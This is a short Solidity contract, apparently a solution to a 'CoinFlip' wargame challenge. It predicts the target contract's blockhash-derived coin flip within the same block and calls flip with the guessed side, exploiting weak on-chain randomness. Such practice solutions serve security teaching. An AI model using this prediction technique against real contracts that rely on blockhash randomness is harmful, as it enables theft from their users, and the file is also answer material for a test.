// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./02CoinFlip.sol";

error WrongPrediction();

contract CoinFlipSolution {
    CoinFlip public coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function solveChallenge() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool coinFlipSide = (blockValue / FACTOR) == 1 ? true : false;
        bool result = coinFlip.flip(coinFlipSide);
        if (result == false) revert WrongPrediction();
    }
}
